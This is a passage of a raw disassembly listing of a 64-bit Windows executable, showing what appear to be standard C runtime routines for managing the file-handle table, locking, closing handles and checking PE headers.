   140008220:	48 8b 05 49 3a 01 00 	mov    0x13a49(%rip),%rax        # 0x14001bc70
   140008227:	48 83 24 f0 00       	andq   $0x0,(%rax,%rsi,8)
   14000822c:	ff c3                	inc    %ebx
   14000822e:	eb 91                	jmp    0x1400081c1
   140008230:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008235:	e8 66 fe ff ff       	call   0x1400080a0
   14000823a:	8b c7                	mov    %edi,%eax
   14000823c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008241:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008246:	48 83 c4 30          	add    $0x30,%rsp
   14000824a:	5f                   	pop    %rdi
   14000824b:	c3                   	ret
   14000824c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008251:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008256:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000825b:	41 57                	push   %r15
   14000825d:	48 83 ec 20          	sub    $0x20,%rsp
   140008261:	48 63 c1             	movslq %ecx,%rax
   140008264:	48 8b f0             	mov    %rax,%rsi
   140008267:	48 c1 fe 05          	sar    $0x5,%rsi
   14000826b:	4c 8d 3d 9e 2c 01 00 	lea    0x12c9e(%rip),%r15        # 0x14001af10
   140008272:	83 e0 1f             	and    $0x1f,%eax
   140008275:	48 6b d8 58          	imul   $0x58,%rax,%rbx
   140008279:	49 8b 3c f7          	mov    (%r15,%rsi,8),%rdi
   14000827d:	83 7c 3b 0c 00       	cmpl   $0x0,0xc(%rbx,%rdi,1)
   140008282:	75 34                	jne    0x1400082b8
   140008284:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140008289:	e8 22 fc ff ff       	call   0x140007eb0
   14000828e:	90                   	nop
   14000828f:	83 7c 3b 0c 00       	cmpl   $0x0,0xc(%rbx,%rdi,1)
   140008294:	75 18                	jne    0x1400082ae
   140008296:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   14000829a:	48 03 cf             	add    %rdi,%rcx
   14000829d:	45 33 c0             	xor    %r8d,%r8d
   1400082a0:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400082a5:	e8 b2 b6 ff ff       	call   0x14000395c
   1400082aa:	ff 44 3b 0c          	incl   0xc(%rbx,%rdi,1)
   1400082ae:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400082b3:	e8 e8 fd ff ff       	call   0x1400080a0
   1400082b8:	49 8b 0c f7          	mov    (%r15,%rsi,8),%rcx
   1400082bc:	48 83 c1 10          	add    $0x10,%rcx
   1400082c0:	48 03 cb             	add    %rbx,%rcx
   1400082c3:	ff 15 7f 8e 00 00    	call   *0x8e7f(%rip)        # 0x140011148
   1400082c9:	b8 01 00 00 00       	mov    $0x1,%eax
   1400082ce:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400082d3:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400082d8:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400082dd:	48 83 c4 20          	add    $0x20,%rsp
   1400082e1:	41 5f                	pop    %r15
   1400082e3:	c3                   	ret
   1400082e4:	48 8b c4             	mov    %rsp,%rax
   1400082e7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400082eb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400082ef:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400082f3:	4c 89 60 20          	mov    %r12,0x20(%rax)
   1400082f7:	41 55                	push   %r13
   1400082f9:	41 56                	push   %r14
   1400082fb:	41 57                	push   %r15
   1400082fd:	48 83 ec 30          	sub    $0x30,%rsp
   140008301:	49 83 cd ff          	or     $0xffffffffffffffff,%r13
   140008305:	41 8b f5             	mov    %r13d,%esi
   140008308:	45 33 e4             	xor    %r12d,%r12d
   14000830b:	41 8d 5d 0c          	lea    0xc(%r13),%ebx
   14000830f:	8b cb                	mov    %ebx,%ecx
   140008311:	e8 66 fc ff ff       	call   0x140007f7c
   140008316:	85 c0                	test   %eax,%eax
   140008318:	75 08                	jne    0x140008322
   14000831a:	41 8b c5             	mov    %r13d,%eax
   14000831d:	e9 9b 01 00 00       	jmp    0x1400084bd
   140008322:	8b cb                	mov    %ebx,%ecx
   140008324:	e8 87 fb ff ff       	call   0x140007eb0
   140008329:	90                   	nop
   14000832a:	41 8b fc             	mov    %r12d,%edi
   14000832d:	44 89 64 24 24       	mov    %r12d,0x24(%rsp)
   140008332:	4c 8d 35 d7 2b 01 00 	lea    0x12bd7(%rip),%r14        # 0x14001af10
   140008339:	83 ff 40             	cmp    $0x40,%edi
   14000833c:	0f 8d 6f 01 00 00    	jge    0x1400084b1
   140008342:	4c 63 ff             	movslq %edi,%r15
   140008345:	4b 8b 1c fe          	mov    (%r14,%r15,8),%rbx
   140008349:	48 85 db             	test   %rbx,%rbx
   14000834c:	0f 84 de 00 00 00    	je     0x140008430
   140008352:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140008357:	4b 8b 04 fe          	mov    (%r14,%r15,8),%rax
   14000835b:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140008361:	48 3b d8             	cmp    %rax,%rbx
   140008364:	0f 83 b2 00 00 00    	jae    0x14000841c
   14000836a:	f6 43 08 01          	testb  $0x1,0x8(%rbx)
   14000836e:	0f 85 98 00 00 00    	jne    0x14000840c
   140008374:	44 39 63 0c          	cmp    %r12d,0xc(%rbx)
   140008378:	75 2f                	jne    0x1400083a9
   14000837a:	b9 0a 00 00 00       	mov    $0xa,%ecx
   14000837f:	e8 2c fb ff ff       	call   0x140007eb0
   140008384:	90                   	nop
   140008385:	44 39 63 0c          	cmp    %r12d,0xc(%rbx)
   140008389:	75 14                	jne    0x14000839f
   14000838b:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   14000838f:	45 33 c0             	xor    %r8d,%r8d
   140008392:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140008397:	e8 c0 b5 ff ff       	call   0x14000395c
   14000839c:	ff 43 0c             	incl   0xc(%rbx)
   14000839f:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400083a4:	e8 f7 fc ff ff       	call   0x1400080a0
   1400083a9:	45 85 e4             	test   %r12d,%r12d
   1400083ac:	75 5e                	jne    0x14000840c
   1400083ae:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1400083b2:	ff 15 90 8d 00 00    	call   *0x8d90(%rip)        # 0x140011148
   1400083b8:	f6 43 08 01          	testb  $0x1,0x8(%rbx)
   1400083bc:	74 0c                	je     0x1400083ca
   1400083be:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1400083c2:	ff 15 88 8d 00 00    	call   *0x8d88(%rip)        # 0x140011150
   1400083c8:	eb 42                	jmp    0x14000840c
   1400083ca:	4c 8d 35 3f 2b 01 00 	lea    0x12b3f(%rip),%r14        # 0x14001af10
   1400083d1:	45 85 e4             	test   %r12d,%r12d
   1400083d4:	75 36                	jne    0x14000840c
   1400083d6:	c6 43 08 01          	movb   $0x1,0x8(%rbx)
   1400083da:	4c 89 2b             	mov    %r13,(%rbx)
   1400083dd:	4b 2b 1c fe          	sub    (%r14,%r15,8),%rbx
   1400083e1:	48 b8 a3 8b 2e ba e8 	movabs $0x2e8ba2e8ba2e8ba3,%rax
   1400083e8:	a2 8b 2e 
   1400083eb:	48 f7 eb             	imul   %rbx
   1400083ee:	48 8b f2             	mov    %rdx,%rsi
   1400083f1:	48 c1 fe 04          	sar    $0x4,%rsi
   1400083f5:	48 8b c6             	mov    %rsi,%rax
   1400083f8:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400083fc:	48 03 f0             	add    %rax,%rsi
   1400083ff:	8b c7                	mov    %edi,%eax
   140008401:	c1 e0 05             	shl    $0x5,%eax
   140008404:	03 f0                	add    %eax,%esi
   140008406:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000840a:	eb 10                	jmp    0x14000841c
   14000840c:	48 83 c3 58          	add    $0x58,%rbx
   140008410:	4c 8d 35 f9 2a 01 00 	lea    0x12af9(%rip),%r14        # 0x14001af10
   140008417:	e9 36 ff ff ff       	jmp    0x140008352
   14000841c:	41 3b f5             	cmp    %r13d,%esi
   14000841f:	0f 85 8c 00 00 00    	jne    0x1400084b1
   140008425:	ff c7                	inc    %edi
   140008427:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   14000842b:	e9 09 ff ff ff       	jmp    0x140008339
   140008430:	ba 58 00 00 00       	mov    $0x58,%edx
   140008435:	8d 4a c8             	lea    -0x38(%rdx),%ecx
   140008438:	e8 77 ee ff ff       	call   0x1400072b4
   14000843d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008442:	48 85 c0             	test   %rax,%rax
   140008445:	74 6a                	je     0x1400084b1
   140008447:	48 63 d7             	movslq %edi,%rdx
   14000844a:	49 89 04 d6          	mov    %rax,(%r14,%rdx,8)
   14000844e:	83 05 0b 38 01 00 20 	addl   $0x20,0x1380b(%rip)        # 0x14001bc60
   140008455:	49 8b 0c d6          	mov    (%r14,%rdx,8),%rcx
   140008459:	48 81 c1 00 0b 00 00 	add    $0xb00,%rcx
   140008460:	48 3b c1             	cmp    %rcx,%rax
   140008463:	73 18                	jae    0x14000847d
   140008465:	66 c7 40 08 00 0a    	movw   $0xa00,0x8(%rax)
   14000846b:	4c 89 28             	mov    %r13,(%rax)
   14000846e:	44 89 60 0c          	mov    %r12d,0xc(%rax)
   140008472:	48 83 c0 58          	add    $0x58,%rax
   140008476:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000847b:	eb d8                	jmp    0x140008455
   14000847d:	c1 e7 05             	shl    $0x5,%edi
   140008480:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140008484:	48 63 cf             	movslq %edi,%rcx
   140008487:	48 8b c1             	mov    %rcx,%rax
   14000848a:	48 c1 f8 05          	sar    $0x5,%rax
   14000848e:	83 e1 1f             	and    $0x1f,%ecx
   140008491:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140008495:	49 8b 04 c6          	mov    (%r14,%rax,8),%rax
   140008499:	c6 44 08 08 01       	movb   $0x1,0x8(%rax,%rcx,1)
   14000849e:	8b cf                	mov    %edi,%ecx
   1400084a0:	e8 a7 fd ff ff       	call   0x14000824c
   1400084a5:	85 c0                	test   %eax,%eax
   1400084a7:	41 0f 44 fd          	cmove  %r13d,%edi
   1400084ab:	8b f7                	mov    %edi,%esi
   1400084ad:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1400084b1:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400084b6:	e8 e5 fb ff ff       	call   0x1400080a0
   1400084bb:	8b c6                	mov    %esi,%eax
   1400084bd:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400084c2:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400084c7:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400084cc:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   1400084d1:	48 83 c4 30          	add    $0x30,%rsp
   1400084d5:	41 5f                	pop    %r15
   1400084d7:	41 5e                	pop    %r14
   1400084d9:	41 5d                	pop    %r13
   1400084db:	c3                   	ret
   1400084dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400084e1:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   1400084e6:	41 56                	push   %r14
   1400084e8:	48 83 ec 20          	sub    $0x20,%rsp
   1400084ec:	85 c9                	test   %ecx,%ecx
   1400084ee:	78 6f                	js     0x14000855f
   1400084f0:	3b 0d 6a 37 01 00    	cmp    0x1376a(%rip),%ecx        # 0x14001bc60
   1400084f6:	73 67                	jae    0x14000855f
   1400084f8:	48 63 c1             	movslq %ecx,%rax
   1400084fb:	4c 8d 35 0e 2a 01 00 	lea    0x12a0e(%rip),%r14        # 0x14001af10
   140008502:	48 8b f8             	mov    %rax,%rdi
   140008505:	83 e0 1f             	and    $0x1f,%eax
   140008508:	48 c1 ff 05          	sar    $0x5,%rdi
   14000850c:	48 6b d8 58          	imul   $0x58,%rax,%rbx
   140008510:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   140008514:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   140008519:	74 44                	je     0x14000855f
   14000851b:	48 83 3c 18 ff       	cmpq   $0xffffffffffffffff,(%rax,%rbx,1)
   140008520:	74 3d                	je     0x14000855f
   140008522:	83 3d 67 2d 01 00 01 	cmpl   $0x1,0x12d67(%rip)        # 0x14001b290
   140008529:	75 27                	jne    0x140008552
   14000852b:	85 c9                	test   %ecx,%ecx
   14000852d:	74 16                	je     0x140008545
   14000852f:	ff c9                	dec    %ecx
   140008531:	74 0b                	je     0x14000853e
   140008533:	ff c9                	dec    %ecx
   140008535:	75 1b                	jne    0x140008552
   140008537:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   14000853c:	eb 0c                	jmp    0x14000854a
   14000853e:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140008543:	eb 05                	jmp    0x14000854a
   140008545:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   14000854a:	33 d2                	xor    %edx,%edx
   14000854c:	ff 15 a6 8c 00 00    	call   *0x8ca6(%rip)        # 0x1400111f8
   140008552:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   140008556:	48 83 0c 03 ff       	orq    $0xffffffffffffffff,(%rbx,%rax,1)
   14000855b:	33 c0                	xor    %eax,%eax
   14000855d:	eb 16                	jmp    0x140008575
   14000855f:	e8 14 c0 ff ff       	call   0x140004578
   140008564:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000856a:	e8 99 bf ff ff       	call   0x140004508
   14000856f:	83 20 00             	andl   $0x0,(%rax)
   140008572:	83 c8 ff             	or     $0xffffffff,%eax
   140008575:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000857a:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   14000857f:	48 83 c4 20          	add    $0x20,%rsp
   140008583:	41 5e                	pop    %r14
   140008585:	c3                   	ret
   140008586:	cc                   	int3
   140008587:	cc                   	int3
   140008588:	48 83 ec 28          	sub    $0x28,%rsp
   14000858c:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000858f:	75 15                	jne    0x1400085a6
   140008591:	e8 72 bf ff ff       	call   0x140004508
   140008596:	83 20 00             	andl   $0x0,(%rax)
   140008599:	e8 da bf ff ff       	call   0x140004578
   14000859e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400085a4:	eb 4d                	jmp    0x1400085f3
   1400085a6:	85 c9                	test   %ecx,%ecx
   1400085a8:	78 31                	js     0x1400085db
   1400085aa:	3b 0d b0 36 01 00    	cmp    0x136b0(%rip),%ecx        # 0x14001bc60
   1400085b0:	73 29                	jae    0x1400085db
   1400085b2:	48 63 c9             	movslq %ecx,%rcx
   1400085b5:	4c 8d 05 54 29 01 00 	lea    0x12954(%rip),%r8        # 0x14001af10
   1400085bc:	48 8b c1             	mov    %rcx,%rax
   1400085bf:	83 e1 1f             	and    $0x1f,%ecx
   1400085c2:	48 c1 f8 05          	sar    $0x5,%rax
   1400085c6:	48 6b d1 58          	imul   $0x58,%rcx,%rdx
   1400085ca:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   1400085ce:	f6 44 10 08 01       	testb  $0x1,0x8(%rax,%rdx,1)
   1400085d3:	74 06                	je     0x1400085db
   1400085d5:	48 8b 04 10          	mov    (%rax,%rdx,1),%rax
   1400085d9:	eb 1c                	jmp    0x1400085f7
   1400085db:	e8 28 bf ff ff       	call   0x140004508
   1400085e0:	83 20 00             	andl   $0x0,(%rax)
   1400085e3:	e8 90 bf ff ff       	call   0x140004578
   1400085e8:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400085ee:	e8 35 bb ff ff       	call   0x140004128
   1400085f3:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400085f7:	48 83 c4 28          	add    $0x28,%rsp
   1400085fb:	c3                   	ret
   1400085fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008601:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008606:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000860b:	41 56                	push   %r14
   14000860d:	48 83 ec 20          	sub    $0x20,%rsp
   140008611:	48 8b da             	mov    %rdx,%rbx
   140008614:	85 c9                	test   %ecx,%ecx
   140008616:	78 65                	js     0x14000867d
   140008618:	3b 0d 42 36 01 00    	cmp    0x13642(%rip),%ecx        # 0x14001bc60
   14000861e:	73 5d                	jae    0x14000867d
   140008620:	48 63 c1             	movslq %ecx,%rax
   140008623:	4c 8d 35 e6 28 01 00 	lea    0x128e6(%rip),%r14        # 0x14001af10
   14000862a:	48 8b f8             	mov    %rax,%rdi
   14000862d:	83 e0 1f             	and    $0x1f,%eax
   140008630:	48 c1 ff 05          	sar    $0x5,%rdi
   140008634:	48 6b f0 58          	imul   $0x58,%rax,%rsi
   140008638:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   14000863c:	48 83 3c 06 ff       	cmpq   $0xffffffffffffffff,(%rsi,%rax,1)
   140008641:	75 3a                	jne    0x14000867d
   140008643:	83 3d 46 2c 01 00 01 	cmpl   $0x1,0x12c46(%rip)        # 0x14001b290
   14000864a:	75 25                	jne    0x140008671
   14000864c:	85 c9                	test   %ecx,%ecx
   14000864e:	74 16                	je     0x140008666
   140008650:	ff c9                	dec    %ecx
   140008652:	74 0b                	je     0x14000865f
   140008654:	ff c9                	dec    %ecx
   140008656:	75 19                	jne    0x140008671
   140008658:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   14000865d:	eb 0c                	jmp    0x14000866b
   14000865f:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140008664:	eb 05                	jmp    0x14000866b
   140008666:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   14000866b:	ff 15 87 8b 00 00    	call   *0x8b87(%rip)        # 0x1400111f8
   140008671:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   140008675:	48 89 1c 06          	mov    %rbx,(%rsi,%rax,1)
   140008679:	33 c0                	xor    %eax,%eax
   14000867b:	eb 16                	jmp    0x140008693
   14000867d:	e8 f6 be ff ff       	call   0x140004578
   140008682:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008688:	e8 7b be ff ff       	call   0x140004508
   14000868d:	83 20 00             	andl   $0x0,(%rax)
   140008690:	83 c8 ff             	or     $0xffffffff,%eax
   140008693:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008698:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000869d:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400086a2:	48 83 c4 20          	add    $0x20,%rsp
   1400086a6:	41 5e                	pop    %r14
   1400086a8:	c3                   	ret
   1400086a9:	cc                   	int3
   1400086aa:	cc                   	int3
   1400086ab:	cc                   	int3
   1400086ac:	48 63 d1             	movslq %ecx,%rdx
   1400086af:	4c 8d 05 5a 28 01 00 	lea    0x1285a(%rip),%r8        # 0x14001af10
   1400086b6:	48 8b c2             	mov    %rdx,%rax
   1400086b9:	83 e2 1f             	and    $0x1f,%edx
   1400086bc:	48 c1 f8 05          	sar    $0x5,%rax
   1400086c0:	48 6b ca 58          	imul   $0x58,%rdx,%rcx
   1400086c4:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   1400086c8:	48 83 c1 10          	add    $0x10,%rcx
   1400086cc:	48 03 c8             	add    %rax,%rcx
   1400086cf:	48 ff 25 7a 8a 00 00 	rex.W jmp *0x8a7a(%rip)        # 0x140011150
   1400086d6:	cc                   	int3
   1400086d7:	cc                   	int3
   1400086d8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400086dd:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400086e1:	56                   	push   %rsi
   1400086e2:	57                   	push   %rdi
   1400086e3:	41 56                	push   %r14
   1400086e5:	48 83 ec 20          	sub    $0x20,%rsp
   1400086e9:	48 63 f9             	movslq %ecx,%rdi
   1400086ec:	83 ff fe             	cmp    $0xfffffffe,%edi
   1400086ef:	75 10                	jne    0x140008701
   1400086f1:	e8 82 be ff ff       	call   0x140004578
   1400086f6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400086fc:	e9 9d 00 00 00       	jmp    0x14000879e
   140008701:	85 c9                	test   %ecx,%ecx
   140008703:	0f 88 85 00 00 00    	js     0x14000878e
   140008709:	3b 3d 51 35 01 00    	cmp    0x13551(%rip),%edi        # 0x14001bc60
   14000870f:	73 7d                	jae    0x14000878e
   140008711:	48 8b c7             	mov    %rdi,%rax
   140008714:	48 8b df             	mov    %rdi,%rbx
   140008717:	48 c1 fb 05          	sar    $0x5,%rbx
   14000871b:	4c 8d 35 ee 27 01 00 	lea    0x127ee(%rip),%r14        # 0x14001af10
   140008722:	83 e0 1f             	and    $0x1f,%eax
   140008725:	48 6b f0 58          	imul   $0x58,%rax,%rsi
   140008729:	49 8b 04 de          	mov    (%r14,%rbx,8),%rax
   14000872d:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   140008732:	83 e1 01             	and    $0x1,%ecx
   140008735:	74 57                	je     0x14000878e
   140008737:	8b cf                	mov    %edi,%ecx
   140008739:	e8 0e fb ff ff       	call   0x14000824c
   14000873e:	90                   	nop
   14000873f:	49 8b 04 de          	mov    (%r14,%rbx,8),%rax
   140008743:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   140008748:	74 2b                	je     0x140008775
   14000874a:	8b cf                	mov    %edi,%ecx
   14000874c:	e8 37 fe ff ff       	call   0x140008588
   140008751:	48 8b c8             	mov    %rax,%rcx
   140008754:	ff 15 a6 8a 00 00    	call   *0x8aa6(%rip)        # 0x140011200
   14000875a:	85 c0                	test   %eax,%eax
   14000875c:	75 0a                	jne    0x140008768
   14000875e:	ff 15 2c 89 00 00    	call   *0x892c(%rip)        # 0x140011090
   140008764:	8b d8                	mov    %eax,%ebx
   140008766:	eb 02                	jmp    0x14000876a
   140008768:	33 db                	xor    %ebx,%ebx
   14000876a:	85 db                	test   %ebx,%ebx
   14000876c:	74 15                	je     0x140008783
   14000876e:	e8 95 bd ff ff       	call   0x140004508
   140008773:	89 18                	mov    %ebx,(%rax)
   140008775:	e8 fe bd ff ff       	call   0x140004578
   14000877a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008780:	83 cb ff             	or     $0xffffffff,%ebx
   140008783:	8b cf                	mov    %edi,%ecx
   140008785:	e8 22 ff ff ff       	call   0x1400086ac
   14000878a:	8b c3                	mov    %ebx,%eax
   14000878c:	eb 13                	jmp    0x1400087a1
   14000878e:	e8 e5 bd ff ff       	call   0x140004578
   140008793:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008799:	e8 8a b9 ff ff       	call   0x140004128
   14000879e:	83 c8 ff             	or     $0xffffffff,%eax
   1400087a1:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400087a6:	48 83 c4 20          	add    $0x20,%rsp
   1400087aa:	41 5e                	pop    %r14
   1400087ac:	5f                   	pop    %rdi
   1400087ad:	5e                   	pop    %rsi
   1400087ae:	c3                   	ret
   1400087af:	cc                   	int3
   1400087b0:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   1400087b4:	45 33 c9             	xor    %r9d,%r9d
   1400087b7:	4c 8b d2             	mov    %rdx,%r10
   1400087ba:	4c 03 c1             	add    %rcx,%r8
   1400087bd:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   1400087c2:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   1400087c7:	48 83 c0 18          	add    $0x18,%rax
   1400087cb:	49 03 c0             	add    %r8,%rax
   1400087ce:	45 85 db             	test   %r11d,%r11d
   1400087d1:	74 1e                	je     0x1400087f1
   1400087d3:	8b 50 0c             	mov    0xc(%rax),%edx
   1400087d6:	4c 3b d2             	cmp    %rdx,%r10
   1400087d9:	72 0a                	jb     0x1400087e5
   1400087db:	8b 48 08             	mov    0x8(%rax),%ecx
   1400087de:	03 ca                	add    %edx,%ecx
   1400087e0:	4c 3b d1             	cmp    %rcx,%r10
   1400087e3:	72 0e                	jb     0x1400087f3
   1400087e5:	41 ff c1             	inc    %r9d
   1400087e8:	48 83 c0 28          	add    $0x28,%rax
   1400087ec:	45 3b cb             	cmp    %r11d,%r9d
   1400087ef:	72 e2                	jb     0x1400087d3
   1400087f1:	33 c0                	xor    %eax,%eax
   1400087f3:	c3                   	ret
   1400087f4:	cc                   	int3
   1400087f5:	cc                   	int3
   1400087f6:	cc                   	int3
   1400087f7:	cc                   	int3
   1400087f8:	cc                   	int3
   1400087f9:	cc                   	int3
   1400087fa:	cc                   	int3
   1400087fb:	cc                   	int3
   1400087fc:	cc                   	int3
   1400087fd:	cc                   	int3
   1400087fe:	cc                   	int3
   1400087ff:	cc                   	int3
   140008800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008805:	57                   	push   %rdi
   140008806:	48 83 ec 20          	sub    $0x20,%rsp
   14000880a:	48 8b d9             	mov    %rcx,%rbx
   14000880d:	48 8d 3d ec 77 ff ff 	lea    -0x8814(%rip),%rdi        # 0x140000000
   140008814:	48 8b cf             	mov    %rdi,%rcx
   140008817:	e8 34 00 00 00       	call   0x140008850
   14000881c:	85 c0                	test   %eax,%eax
   14000881e:	74 22                	je     0x140008842
   140008820:	48 2b df             	sub    %rdi,%rbx
   140008823:	48 8b d3             	mov    %rbx,%rdx
   140008826:	48 8b cf             	mov    %rdi,%rcx
   140008829:	e8 82 ff ff ff       	call   0x1400087b0
   14000882e:	48 85 c0             	test   %rax,%rax
   140008831:	74 0f                	je     0x140008842
   140008833:	8b 40 24             	mov    0x24(%rax),%eax
   140008836:	c1 e8 1f             	shr    $0x1f,%eax
   140008839:	f7 d0                	not    %eax
   14000883b:	83 e0 01             	and    $0x1,%eax
   14000883e:	eb 02                	jmp    0x140008842
   140008840:	33 c0                	xor    %eax,%eax
   140008842:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008847:	48 83 c4 20          	add    $0x20,%rsp
   14000884b:	5f                   	pop    %rdi
   14000884c:	c3                   	ret
   14000884d:	cc                   	int3
   14000884e:	cc                   	int3
   14000884f:	cc                   	int3
   140008850:	48 8b c1             	mov    %rcx,%rax
   140008853:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140008858:	66 39 08             	cmp    %cx,(%rax)
   14000885b:	74 03                	je     0x140008860
   14000885d:	33 c0                	xor    %eax,%eax
   14000885f:	c3                   	ret
   140008860:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140008864:	48 03 c8             	add    %rax,%rcx
   140008867:	33 c0                	xor    %eax,%eax
   140008869:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000886f:	75 0c                	jne    0x14000887d
   140008871:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140008876:	66 39 51 18          	cmp    %dx,0x18(%rcx)
   14000887a:	0f 94 c0             	sete   %al
   14000887d:	c3                   	ret
   14000887e:	cc                   	int3
   14000887f:	cc                   	int3
   140008880:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008885:	57                   	push   %rdi
   140008886:	48 83 ec 50          	sub    $0x50,%rsp
   14000888a:	45 8b d0             	mov    %r8d,%r10d
   14000888d:	4c 8b c1             	mov    %rcx,%r8
   140008890:	83 64 24 44 00       	andl   $0x0,0x44(%rsp)
   140008895:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   14000889a:	33 c0                	xor    %eax,%eax
   14000889c:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400088a3:	00 
   1400088a4:	48 85 db             	test   %rbx,%rbx
   1400088a7:	0f 95 c0             	setne  %al
   1400088aa:	85 c0                	test   %eax,%eax
   1400088ac:	75 18                	jne    0x1400088c6
   1400088ae:	e8 c5 bc ff ff       	call   0x140004578
   1400088b3:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400088b8:	89 18                	mov    %ebx,(%rax)
   1400088ba:	e8 69 b8 ff ff       	call   0x140004128
   1400088bf:	8b c3                	mov    %ebx,%eax
   1400088c1:	e9 8d 00 00 00       	jmp    0x140008953
   1400088c6:	83 0b ff             	orl    $0xffffffff,(%rbx)
   1400088c9:	33 c0                	xor    %eax,%eax
   1400088cb:	48 85 c9             	test   %rcx,%rcx
   1400088ce:	0f 95 c0             	setne  %al
   1400088d1:	85 c0                	test   %eax,%eax
   1400088d3:	74 d9                	je     0x1400088ae
   1400088d5:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   1400088dc:	85 c9                	test   %ecx,%ecx
   1400088de:	74 13                	je     0x1400088f3
   1400088e0:	41 f7 c1 7f fe ff ff 	test   $0xfffffe7f,%r9d
   1400088e7:	b8 00 00 00 00       	mov    $0x0,%eax
   1400088ec:	0f 94 c0             	sete   %al
   1400088ef:	85 c0                	test   %eax,%eax
   1400088f1:	74 bb                	je     0x1400088ae
   1400088f3:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   1400088f7:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   1400088fc:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   140008901:	44 8b ca             	mov    %edx,%r9d
   140008904:	48 8b d3             	mov    %rbx,%rdx
   140008907:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000890c:	e8 4f 00 00 00       	call   0x140008960
   140008911:	8b f8                	mov    %eax,%edi
   140008913:	89 44 24 44          	mov    %eax,0x44(%rsp)
